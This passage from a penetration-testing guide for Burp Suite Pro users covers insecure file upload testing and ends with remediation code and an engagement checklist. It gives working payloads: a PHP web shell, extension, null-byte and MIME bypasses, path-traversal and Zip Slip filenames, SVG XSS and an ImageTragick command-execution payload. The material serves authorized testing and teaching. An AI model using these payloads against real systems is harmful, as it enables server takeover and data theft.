   from cryptography.hazmat.primitives.ciphers.aead import AESGCM
   cipher = AESGCM(key)
   ciphertext = cipher.encrypt(nonce, plaintext, aad)
   ```

3. **Use secure randomness:**
   ```python
   import secrets
   token = secrets.token_urlsafe(32)
   ```

4. **Use strong JWT signing:**
   ```python
   import jwt
   token = jwt.encode(payload, secret_key, algorithm="HS256")
   # Use strong secret (32+ bytes)
   ```

5. **Use TLS 1.3:**
   ```
   ssl_protocols TLSv1.3;
   ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:...;
   ```

---

## Phase 20: Insecure File Upload

**Goal:** Identify file upload vulnerabilities allowing arbitrary file execution and directory traversal.

### 20.1 Identify File Upload Entry Points

**Look for upload features:**

- Profile picture upload
- Document upload (PDF, Word, Excel)
- Resume upload
- Attachment upload
- Import/bulk upload
- Video/media upload
- Plugin/extension upload

### 20.2 Test File Type Validation Bypass

**Upload executable files with benign extensions:**

**Test 1: Direct executable upload**

```
Filename: shell.php
Content: <?php system($_GET['cmd']); ?>
```

If uploaded and accessible:
```
❌ FINDING: Arbitrary PHP execution
```

**Test 2: Double extension bypass**

```
Filename: shell.php.jpg
Content: <?php system($_GET['cmd']); ?>
```

Some servers execute `.php` even with `.jpg` after it.

**Test 3: Null byte bypass**

```
Filename: shell.php%00.jpg
Content: <?php system($_GET['cmd']); ?>
```

Legacy servers might truncate at null byte.

### 20.3 Test MIME Type Validation Bypass

**Intercept upload in Burp:**

```
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
```

**Bypass techniques:**

1. Change MIME type to image/jpeg (but keep PHP code)
2. Add image magic bytes before PHP code:
   ```
   \xFF\xD8\xFF\xE0 (JPEG header)
   <?php system($_GET['cmd']); ?>
   ```

### 20.4 Test Path Traversal in Filename

**Filename with directory traversal:**

```
Filename: ../../var/www/html/shell.php
```

If server saves without sanitizing, file ends up outside upload dir.

**Test:**

```
Filename: ../../../public_html/shell.php
Filename: ..%2f..%2fweb%2fshell.php
```

### 20.5 Test Archive Extraction Vulnerabilities

**If app extracts ZIP files:**

Create malicious ZIP:
```bash
# Create file outside target directory
echo "<?php system($_GET['cmd']); ?>" > ../../shell.php

# Create ZIP with path traversal
zip archive.zip ../../shell.php
```

If app extracts without validation:
```
❌ FINDING: Arbitrary file write via ZIP extraction
```

### 20.6 Test SVG/Image Polyglot Attacks

**SVG files can contain JavaScript:**

```xml
<?xml version="1.0" standalone="no"?>
<svg onload="alert('XSS')">
  <circle cx="50" cy="50" r="40" />
</svg>
```

Save as `image.svg` and upload.

If SVG is displayed in browser:
```
❌ FINDING: XSS via SVG upload
```

### 20.7 Test ImageTragick (ImageMagick RCE)

**If server processes images with ImageMagick:**

Create exploit image:
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg)|touch /tmp/pwned#'
pop graphic-context
```

Upload as PNG/JPG.

If ImageMagick processes it:
```
❌ FINDING: RCE via ImageMagick
```

### 20.8 Test Directory Traversal in Filenames

**Polyglot ZIP + directory traversal:**

Create ZIP with:
```
file1: normal.txt
file2: ../../shell.php
```

On extraction, `shell.php` may end up outside intended directory.

### 20.9 Test File Size Limits

**Upload large files:**

1. Generate 10GB file
2. Upload
3. Does server run out of disk space?
4. Does server timeout?
5. Can you cause DoS?

### 20.10 Test Filename Injection

**Special characters in filename:**

```
Filename: shell.php;.jpg
Filename: shell.php%20
Filename: shell.php\x00.jpg
Filename: shell.php:::$DATA (Windows ADS)
```

Some systems may execute despite extension.

### 20.11 Test Content-Type Header Validation

**Upload file with wrong Content-Type:**

```
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=boundary

--boundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/octet-stream

<?php system($_GET['cmd']); ?>
--boundary--
```

If server only checks Content-Type header (not actual file content):
```
❌ FINDING: PHP file uploaded with wrong MIME type
```

### 20.12 Test Zip Slip Vulnerability

**Archive extraction vulnerability:**

```
# Create archive with path traversal
/uploads/normal.txt
../../shell.php
```

On extraction, server might allow files outside target directory.

**Test:**

```bash
cd /tmp
mkdir vulnerable
cd vulnerable
# Create archive with:
# uploads/normal.txt
# ../../shell.php
zip archive.zip ../../../../../tmp/shell.php
```

Upload `archive.zip`. If extracted:
- `/tmp/shell.php` created (outside upload dir)
- Server vulnerable to Zip Slip

### 20.13 Remediation

**Fix insecure file uploads:**

1. **Validate file type by content, not extension:**
   ```python
   import magic
   file_type = magic.from_buffer(file_content, mime=True)
   if file_type not in ['image/jpeg', 'image/png', 'application/pdf']:
       return "Invalid file type", 400
   ```

2. **Sanitize filename:**
   ```python
   import os
   filename = os.path.basename(user_filename)  # Remove path
   filename = re.sub(r'[^a-zA-Z0-9.-]', '', filename)  # Remove special chars
   filename = secrets.token_hex(8) + '_' + filename  # Random prefix
   ```

3. **Store uploads outside web root:**
   ```python
   # Bad: /var/www/html/uploads/ (web-accessible)
   # Good: /var/data/uploads/ (not in web root)
   # Then serve via download endpoint
   ```

4. **Disable script execution in upload dir:**
   ```apache
   # .htaccess in upload directory
   <FilesMatch "\.php$">
       Deny from all
   </FilesMatch>
   ```

5. **Validate archive contents:**
   ```python
   import zipfile
   with zipfile.ZipFile(uploaded_file) as z:
       for name in z.namelist():
           if '..' in name or name.startswith('/'):
               return "Invalid archive", 400
   ```

6. **Set appropriate headers:**
   ```
   Content-Disposition: attachment; filename="document.pdf"
   X-Content-Type-Options: nosniff
   ```

---

## Burp Pro Extensions & Tools

**Recommended Extensions:**
- **Burp Bounty** — Custom vulnerability checks
- **Logger++** — Advanced logging/filtering
- **Active Scan++** — Extra scan checks
- **Paraminer** — Discover parameters from JS
- **Wappalyzer** — Technology identification
- **JWT Editor** — Decode and modify JWTs
- **Burp Collaborator** — Out-of-band testing (blind SQLi, XXE, SSRF)

**Installation:**
```
Burp → Extensions → BApp Store → Search → Install
```

---

## Workflow Checklist

Use this as your engagement template:

- [ ] Phase 1: Reconnaissance & Mapping
  - [ ] Passive crawl complete
  - [ ] Active spider finished
  - [ ] API endpoints documented
  - [ ] Technology stack identified

- [ ] Phase 2: Scanning & Enumeration
  - [ ] Active scanner completed
  - [ ] Results reviewed
  - [ ] False positives filtered

- [ ] Phase 3: Configuration Review
  - [ ] SSL/TLS analyzed
  - [ ] Security headers checked
  - [ ] Cookies reviewed
  - [ ] Server tech documented

- [ ] Phase 4: Authentication Testing
  - [ ] Login flow analyzed
  - [ ] Default credentials tested
  - [ ] Rate limiting checked
  - [ ] Session fixation tested

- [ ] Phase 5: Session Management
  - [ ] Timeout duration tested
  - [ ] Token entropy verified
  - [ ] Logout invalidation tested
  - [ ] CSRF protection verified

- [ ] Phase 6: Authorization Testing
  - [ ] Horizontal escalation tested
  - [ ] Vertical escalation tested
  - [ ] IDOR vulnerabilities checked
  - [ ] Parameter-based escalation tested

- [ ] Phase 7: Input Validation & Injection
  - [ ] SQL injection tested
  - [ ] NoSQL injection tested
  - [ ] XSS tested (reflected/stored)
  - [ ] Command injection tested
  - [ ] Template injection tested

- [ ] Phase 8: Business Logic Testing
  - [ ] Price manipulation tested
  - [ ] Quantity bypass tested
  - [ ] Coupon stacking tested
  - [ ] Race conditions tested
  - [ ] Function-level access control tested

- [ ] Phase 9: Client-Side Security
  - [ ] Source code reviewed
  - [ ] JavaScript analyzed
  - [ ] DOM-based XSS tested
  - [ ] Client-side validation bypassed
  - [ ] Local storage reviewed
  - [ ] JWT analyzed (if used)
  - [ ] Open redirects tested

- [ ] Phase 10: Reporting
  - [ ] Issues exported from Burp
  - [ ] DREAD scoring completed
  - [ ] Findings documented
  - [ ] False positives removed
  - [ ] Remediation roadmap created
  - [ ] Report generated

- [ ] Phase 11: CORS Misconfiguration Testing
  - [ ] CORS headers reviewed
  - [ ] Overly permissive CORS tested
  - [ ] Origin validation bypass attempted
  - [ ] Preflight requests tested
  - [ ] Credential-based CORS tested
  - [ ] Reflected origin tested

- [ ] Phase 12: XXE (XML External Entity) Injection
  - [ ] XML input points identified
  - [ ] Basic XXE payload tested
  - [ ] External entity tested
  - [ ] XXE DoS (Billion Laughs) tested
  - [ ] SOAP XXE tested
  - [ ] Blind XXE via Collaborator tested
  - [ ] File uploads with XXE tested

- [ ] Phase 13: SSRF (Server-Side Request Forgery)
  - [ ] SSRF entry points identified
  - [ ] Internal IP access tested
  - [ ] Local file access tested
  - [ ] Cloud metadata tested (AWS, GCP, Azure)
  - [ ] Port scanning via SSRF tested
  - [ ] Protocol smuggling tested
  - [ ] Blind SSRF via Collaborator tested

- [ ] Phase 14: Host Header Injection
  - [ ] Host header injection tested
  - [ ] Password reset link injection tested
  - [ ] Cache poisoning via Host header tested
  - [ ] Host header bypass techniques tested
  - [ ] Vulnerable response patterns identified

- [ ] Phase 15: Path Traversal / Directory Traversal
  - [ ] Basic path traversal tested
  - [ ] Windows path traversal tested
  - [ ] Null byte injection tested
  - [ ] Double encoding bypass tested
  - [ ] Case sensitivity bypass tested
  - [ ] Blocked character alternatives tested
  - [ ] Specific file access attempted

- [ ] Phase 16: Cache Poisoning
  - [ ] Cached responses identified
  - [ ] Basic cache poisoning tested
  - [ ] Host header cache poisoning tested
  - [ ] User-Agent cache poisoning tested
  - [ ] Accept header cache poisoning tested
  - [ ] Keyed response poisoning tested
  - [ ] Cache TTL identified

- [ ] Phase 17: Insecure Deserialization
  - [ ] Serialization entry points identified
  - [ ] PHP serialization tested
  - [ ] Java deserialization tested
  - [ ] Python pickle exploitation tested
  - [ ] Serialization filters tested
  - [ ] Gadget chains identified

- [ ] Phase 18: Sensitive Data Exposure
  - [ ] API response data reviewed
  - [ ] Oversharing in responses tested
  - [ ] Source code reviewed for secrets
  - [ ] Git repository exposure tested
  - [ ] Error message verbosity assessed
  - [ ] Unencrypted sensitive data tested
  - [ ] Logging for sensitive data checked
  - [ ] Autocomplete/history tested
  - [ ] JWT data reviewed

- [ ] Phase 19: Weak Cryptography
  - [ ] Hashing algorithms analyzed
  - [ ] Encryption methods identified
  - [ ] Hardcoded encryption keys searched for
  - [ ] JWT signing algorithm reviewed
  - [ ] Algorithm confusion attack tested
  - [ ] Predictable random values tested
  - [ ] SSL/TLS configuration analyzed
  - [ ] Key exchange strength evaluated

- [ ] Phase 20: Insecure File Upload
  - [ ] File upload entry points identified
  - [ ] File type validation bypass tested
  - [ ] Double extension bypass tested
  - [ ] Null byte bypass tested
  - [ ] MIME type validation bypass tested
  - [ ] Path traversal in filename tested
  - [ ] Archive extraction vulnerabilities tested
  - [ ] SVG/polyglot attack tested
  - [ ] ImageMagick RCE tested
  - [ ] Filename injection tested
  - [ ] Content-Type bypass tested
  - [ ] Zip Slip vulnerability tested

---

## Tips & Tricks

### Burp Keyboard Shortcuts
- `Ctrl+R` — Send to Repeater
- `Ctrl+I` — Send to Intruder
- `Ctrl+D` → Send to Dashboard
- `Ctrl+U` — URL decode
- `Ctrl+Shift+U` — URL encode

### Common Wordlists
- **SecLists:** `/usr/share/wordlists/SecLists/`
- **Burp built-in:** Settings → Intruder → Payload options

### Faster Testing
- Use Burp Teams for parallel testing (enterprise)
- Use Intruder in burp batches (for multiple tests)
- Enable "Use passive" in Scanner to find obvious issues first

### Documentation
- Screenshot key findings in Burp
- Copy requests/responses to report
- Maintain a checklist during testing
- Record time spent on each phase (for billing)

---

## References

- OWASP Web Security Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
- Burp Documentation: https://portswigger.net/burp/documentation
- PortSwigger Web Security Academy: https://portswigger.net/web-security
- OWASP Top 10: https://owasp.org/www-project-top-ten/

---

**Version:** 2.0  
**Last Updated:** 2026-04-03  
**For:** Burp Suite Pro users following WSTG methodology

---

## Changelog

### v2.0 (2026-04-03)
- Added Phase 11: CORS Misconfiguration Testing
- Added Phase 12: XXE (XML External Entity) Injection
- Added Phase 13: SSRF (Server-Side Request Forgery)
- Added Phase 14: Host Header Injection
- Added Phase 15: Path Traversal / Directory Traversal
- Added Phase 16: Cache Poisoning
- Added Phase 17: Insecure Deserialization
- Added Phase 18: Sensitive Data Exposure
- Added Phase 19: Weak Cryptography
- Added Phase 20: Insecure File Upload
- Updated table of contents and workflow checklist for all new phases
- Each new phase includes comprehensive coverage of testing techniques, Burp Pro workflows, payloads, remediation, and copy-paste ready PoCs

### v1.0 (Initial Release)
- Phases 1-10: Core WSTG methodology coverage
